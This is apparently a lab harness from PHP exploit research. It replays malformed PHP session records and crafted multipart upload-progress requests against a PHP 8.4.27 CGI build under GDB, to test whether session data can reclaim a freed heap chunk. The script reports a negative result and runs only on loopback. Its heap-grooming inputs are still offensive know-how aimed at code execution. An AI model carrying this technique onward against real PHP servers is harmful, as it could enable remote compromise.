#!/usr/bin/env python3
"""Stage B extension: can session data claim the freed startup tzcache chunk?

Bounded negative experiment (loopback only). Replays a malformed PHP-serialize
session record under the committed Stage A GDB fieldprobe. No query string is
sent, so session decode is the only request-time allocator before the
PRE-RINIT "Failed to decode session object" warning. The record shapes try a
stdClass object and long zend_strings, before and after the failing string,
to see whether any session-derived 56-byte allocation reuses the stale chunk
with a real pointer at offset 16 and mask=0 (the combination Stage B found
missing in query and multipart grooming).

Observed on plain 8.4.27 (logs in lab/build/evidence/stageB/sessgroom-*.log):
every shape, including object records, leaves the stale chunk holding a
genuine one-element HashTable (`flags=0x10`, `mask=fffffffe`, real
`arData=0x5555…`); rc 0, no fault, and the warning is emitted in every leg.
At the warning the stale chunk already holds a genuine one-element
HashTable (which allocation claims it is UNKNOWN); no session-derived
object or string claims it in these shapes, so this channel cannot
supply a chosen pointer. Other SAPIs remain UNKNOWN.

Replay: python3 lab/repro/php2shell-stageB-session-channel.py
"""
import importlib.util
import os
import pathlib
import re
import subprocess
import tempfile

ROOT = pathlib.Path(__file__).resolve().parents[2]
GROOM = ROOT / 'lab/repro/php2shell-stageA-groom.py'
spec = importlib.util.spec_from_file_location('groom', GROOM)
groom = importlib.util.module_from_spec(spec)
spec.loader.exec_module(groom)

PHP = ROOT / 'lab/build/php-8.4.27-plain/sapi/cgi/php-cgi'
OUT = ROOT / 'lab/build/evidence/stageB'
BOUNDARY = groom.BOUNDARY
SID = groom.SID

# Each record fails php session decode (emitting the warning) while trying to
# allocate the chosen object/string first. 's:64:"AA"' declares more bytes
# than exist, which is the decode failure trigger.
BAD = 'data|s:64:"AA";'
RECORDS = {
    'bad-only': BAD,
    'obj-then-bad': 'obj|O:8:"stdClass":0:{};' + BAD,
    'obj-prop10-then-bad':
        'obj|O:8:"stdClass":1:{s:1:"x";s:10:"ABCDEFGHIJ";};' + BAD,
    'obj-prop24-then-bad':
        'obj|O:8:"stdClass":1:{s:1:"x";s:24:"ABCDEFGHIJABCDEFGHIJABCD";};' + BAD,
    'str10-then-bad': 's|s:10:"ABCDEFGHIJ";' + BAD,
    'str24-then-bad': 's|s:24:"ABCDEFGHIJABCDEFGHIJABCD";' + BAD,
    'bad-then-obj': BAD + 'obj|O:8:"stdClass":0:{};',
}


def run(record, log):
    with tempfile.TemporaryDirectory(prefix='sessgroom-', dir=OUT) as tmp:
        base = pathlib.Path(tmp)
        sess = base / 'sess'
        sess.mkdir()
        (sess / ('sess_' + SID)).write_text(record)
        (base / 'worker.php').write_text('<?php echo "worker\\n";')
        parts = [
            '--%s\r\nContent-Disposition: form-data; '
            'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nprog\r\n' % BOUNDARY,
            '--%s\r\nContent-Disposition: form-data; name="file1"; '
            'filename="a.txt"\r\n\r\n1\r\n' % BOUNDARY,
        ]
        body = (''.join(parts) + '--%s--\r\n' % BOUNDARY).encode()
        (base / 'body').write_bytes(body)
        env = dict(os.environ)
        env.update(USE_ZEND_ALLOC='0', USE_TRACKED_ALLOC='1',
                   ASAN_OPTIONS='detect_leaks=0:abort_on_error=1',
                   UBSAN_OPTIONS='halt_on_error=1:print_stacktrace=1',
                   REDIRECT_STATUS='1', REQUEST_METHOD='POST',
                   QUERY_STRING='',
                   CONTENT_TYPE='multipart/form-data; boundary=' + BOUNDARY,
                   CONTENT_LENGTH=str(len(body)),
                   SCRIPT_FILENAME=str(base / 'worker.php'),
                   PATH_TRANSLATED=str(base / 'worker.php'),
                   HTTP_COOKIE='PHPSESSID=' + SID)
        args = [str(PHP), '-n', '-q',
                '-d', 'error_log=%s' % (base / 'error.log'),
                '-d', 'log_errors=1', '-d', 'display_errors=0',
                '-d', 'error_reporting=32767', '-d', 'date.timezone=Bogus/Zone',
                '-d', 'max_input_vars=1000', '-d', 'file_uploads=1',
                '-d', 'upload_max_filesize=1024',
                '-d', 'session.save_path=%s' % sess,
                '-d', 'session.name=PHPSESSID',
                '-d', 'session.use_strict_mode=0', '-d', 'session.cache_limiter=',
                '-d', 'session.save_handler=files',
                '-d', 'session.serialize_handler=php',
                '-d', 'session.upload_progress.enabled=1',
                '-d', 'session.upload_progress.cleanup=0',
                '-d', 'session.upload_progress.prefix=upload_progress_',
                '-d', 'session.upload_progress.name=PHP_SESSION_UPLOAD_PROGRESS',
                '-d', 'session.upload_progress.freq=1%',
                '-d', 'session.upload_progress.min_freq=0.000000001']
        args = ['gdb', '-q', '-batch', '-x', str(groom.GDB_PROBE), '--args'] + args
        log.write('record=%r\n' % record)
        log.flush()
        with open(base / 'body', 'rb') as fh:
            proc = subprocess.run(args, env=env, stdin=fh,
                                  stdout=subprocess.PIPE,
                                  stderr=subprocess.STDOUT, timeout=60)
        log.write(proc.stdout.decode(errors='replace'))
        log.write('\nrc=%d\n' % proc.returncode)
        err = base / 'error.log'
        if err.exists():
            log.write('error_log:\n' + err.read_text(errors='replace'))
        log.flush()
    text = pathlib.Path(log.name).read_text(errors='replace')
    hits = re.findall(r'^STALE ht=.*$', text, re.M)
    fault = 'SIGSEGV' if 'Program received signal SIGSEGV' in text else '-'
    rc = re.findall(r'^rc=(\d+)', text, re.M)
    warning = 'Failed to decode session object' in text
    return fault, rc[-1] if rc else '?', warning, hits[-1] if hits else 'NO HIT'


def main():
    OUT.mkdir(parents=True, exist_ok=True)
    for tag, record in RECORDS.items():
        log = OUT / ('sessgroom-%s.log' % tag)
        with log.open('w') as fh:
            fault, rc, warning, hit = run(record, fh)
        print('%-24s fault=%-7s rc=%s warn=%s %s'
              % (tag, fault, rc, 'Y' if warning else 'N', hit))
        print('  log=%s' % log)


if __name__ == '__main__':
    main()
